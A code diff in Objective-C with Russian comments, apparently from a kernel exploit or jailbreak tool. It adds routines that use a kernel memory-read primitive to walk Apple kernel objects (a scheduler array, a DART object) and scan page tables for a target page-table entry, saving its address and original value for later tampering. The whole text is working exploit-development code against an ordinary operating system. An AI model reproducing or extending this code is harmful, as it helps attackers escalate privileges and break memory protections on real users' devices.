@@ -6669,8 +6669,18 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
             kpNote(r, [NSString stringWithFormat:@"  [P2] scheduler=%#llx arr=%#llx — матч записей по [ep+0x788]==surfVA / [ep+0x48]==ucVA",
                       (unsigned long long)schVA, (unsigned long long)earr]);
             if (kpLooksLikeKernelPointer(earr)) {
-                // 1.9.171: диагностика — дамп первых 8 живых записей с полями
-                // layout'а (видно, чему равны surface/UC поля на самом деле)
+                // 1.9.172: [sched+0xc8] может быть OSArray с ВНУТРЕННИМ буфером —
+                // дамп первых qwords объекта; первый kernel-ptr сканируем как буфер
+                uint64_t inner = 0;
+                for (uint32_t o = 0; o + 8 <= 0x40; o += 8) {
+                    uint64_t q = early_kread64(earr + o);
+                    uint64_t u = kp_untag_ptr(q);
+                    kpNote(r, [NSString stringWithFormat:@"    arrObj+%#x: %#018llx%@", o, (unsigned long long)q,
+                              (!inner && kpLooksLikeKernelPointer(u) && kvtophys(u)) ? @" ← буфер?" : @""]);
+                    if (!inner && kpLooksLikeKernelPointer(u) && kvtophys(u)) inner = u;
+                }
+                if (inner) earr = inner;
+                // диагностика — дамп первых 8 живых записей с полями layout'а
                 int shown = 0, live = 0;
                 for (uint32_t i = 0; i < 384 && shown < 8; i++) {
                     uint64_t ep = kp_untag_ptr(early_kread64(earr + i * 8));
@@ -6776,6 +6786,38 @@ static int kpJSubmitAsync(io_connect_t conn, uint32_t srcID, uint32_t dstID,
                 }
             } else {
                 kpNote(r, @"  [P2] tableRoot не найден (group/дубль пусты)");
+            }
+        }
+        // 1.9.172: FALLBACK — PTE сканом по таблицам от ТЕРМИНАЛЬНОГО dartObj
+        // (cmd/op-entry не нужны): mapping персистит, PTE в leaf-таблице;
+        // указатели под kvtophys-гейтом (1.9.162 ребутил без гейта на Nub'е —
+        // теперь правильный терминальный объект + гейты).
+        if (!pteVA && kpLooksLikeKernelPointer(dartVA)) {
+            uint64_t gptrs[32];
+            int gn = 0, gskip = 0;
+            for (uint32_t o = 0; o + 8 <= 0x1000 && gn < 32; o += 8) {
+                uint64_t p = kp_untag_ptr(early_kread64(dartVA + o));
+                if (!kpLooksLikeKernelPointer(p)) continue;
+                BOOL dup = NO;
+                for (int j = 0; j < gn; j++) if (gptrs[j] == p) { dup = YES; break; }
+                if (dup) continue;
+                if (!kvtophys(p)) { gskip++; continue; }
+                gptrs[gn++] = p;
+            }
+            kpNote(r, [NSString stringWithFormat:@"  [P2] dartObj: %d указателей (гейт отсеял %d) — скан страниц на PTE (PA-маска)", gn, gskip]);
+            for (int g = 0; g < gn && !pteVA; g++) {
+                uint32_t lim2 = 0x4000 - (uint32_t)(gptrs[g] & 0x3fff);
+                for (uint32_t o2 = 0; o2 + 8 <= lim2; o2 += 8) {
+                    uint64_t q = early_kread64(gptrs[g] + o2);
+                    if ((q & 0x000003FFFE000000ULL) != (backingPA & 0x000003FFFE000000ULL)) continue;
+                    if (!(q & ~0x000003FFFE000000ULL)) continue;   // голый PA без флагов — не PTE
+                    pteVA = gptrs[g] + o2;
+                    origPTE = q;
+                    kpNote(r, [NSString stringWithFormat:@"  [P2] ★ PTE @ %#llx (страница %#llx): %#018llx (флаги %#llx)",
+                              (unsigned long long)pteVA, (unsigned long long)gptrs[g],
+                              (unsigned long long)q, (unsigned long long)(q >> 51)]);
+                    break;
+                }
             }
         }
         if (pteVA) {
